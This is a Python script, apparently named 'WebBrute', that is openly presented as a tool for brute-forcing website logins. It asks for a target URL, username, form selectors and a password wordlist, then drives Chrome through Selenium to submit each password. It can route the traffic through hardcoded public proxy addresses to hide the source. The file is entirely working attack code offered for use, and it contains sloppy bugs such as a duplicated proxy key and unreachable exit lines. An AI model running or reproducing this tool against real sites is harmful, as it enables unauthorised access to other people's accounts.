#!/usr/bin/env python3

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import StaleElementReferenceException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
import requests
import sys
import time
import os 

driver_path = "C:\\webdrivers\\chromedriver.exe"

banner = """ 

  _/          _/            _/        _/_/_/                          _/               
 _/          _/    _/_/    _/_/_/    _/    _/  _/  _/_/  _/    _/  _/_/_/_/    _/_/    
_/    _/    _/  _/_/_/_/  _/    _/  _/_/_/    _/_/      _/    _/    _/      _/_/_/_/   
 _/  _/  _/    _/        _/    _/  _/    _/  _/        _/    _/    _/      _/          
  _/  _/        _/_/_/  _/_/_/    _/_/_/    _/          _/_/_/      _/_/    _/_/_/     
		Coded By: Proxy Programmer
		Version 0.1
		Made For Brute Forcing Logins

 """


def start_request():
	
	global url
	
	try:
		print((banner))
		url = input("Enter Website: ")


		check = requests.get(url)
		if check.status_code == 200:
			print("[!] Host is Avaliable for Brute Force!")
			time.sleep(2)
			option_proxy()

			os.system("cls")
			print(banner)
			time.sleep(3)

		elif check.status_code == 404:
			print("404 Host Not Found!")

	except KeyboardInterrupt:
		print("Opps You Pressed Control^C")

def option_proxy():

	proxy_start = input("\nWould You Like to start a Proxy [Y/N]: ")

	if proxy_start == "Y":
		print("[+] Starting Proxy")
		time.sleep(3)
		start_proxy()
	elif proxy_start == "N":
		print("[!!!] Starting with out Proxy")
		time.sleep(3)
		start_brute()
	else:
		print("Exiting...")
		sys.exit(0)



def start_proxy():
	try:

		proxies = {'http' : "http://138.122.140.18:3128", 'http' : "http://24.172.225.122:53281"} 
		# able to connect to HTTPS URLs and don’t care if the proxy can read it (more fool you!)
		# This establishes an HTTP connection to your proxy, which should then establish an HTTPS connection upstream. This isn’t secure, but we really want it!
		
		while True:
			print("\n")
			start_connection = requests.get(url, proxies=proxies)
			session_start = requests.Session()
			session_start.proxies = proxies
			print("[!] Connected to http://138.122.140.18:3128 & http://24.172.225.122:53281")

			if start_connection.status_code == 200:
				print("[!] Proxy Connection Established")
				print(banner)
				start_brute()
			else:
				break
				print("Exiting...")
				sys.exit(0)
	except KeyboardInterrupt:
		print("[!] Opps You Pressed Control^C")
	except requests.ConnectionError:
		print("[!] Could not Connect to HTTP Proxy, Configure the Proxy in Code")



def start_brute():
	print("\n")
	target_username = input("[+] Enter Target Username: ")
	user_selector = input("[+] Enter Username Selector: ")
	password_selector = input("[+] Enter Password Selector: ")
	button_selector = input("[+] Enter Button Selector: ")
	wordlist = input("[+] Enter Wordlist: ")

	input("\nPress Enter to open Browser... ")
	
	pass_list = open(wordlist, "r")


	driver = webdriver.Chrome(driver_path)

	for line in pass_list:
		try:

			form = driver.get(url)

			css_username = driver.find_element_by_css_selector(user_selector)

			css_password = driver.find_element_by_css_selector(password_selector)

			css_button = driver.find_element_by_css_selector(button_selector)

			css_username.send_keys(target_username)
			css_password.send_keys(line)
			time.sleep(1)
			form_submit = css_button.submit()


			print("[!] Trying Password: " + line)
			print("^^^ IF CHROME CLOSES THIS IS YOUR PASSWORD ^^^")
			print("\n")

		except KeyboardInterrupt:
			print("Stopping Brute Force!")
			break
			sys.exit(0)

	if line == None:
		print("[!] End Of Wordlist...")
		print("[!] Password Not Found!")
	else:
		print("[!] End Of Wordlist...")
		print("[!] Password Not Found!")


start_request()










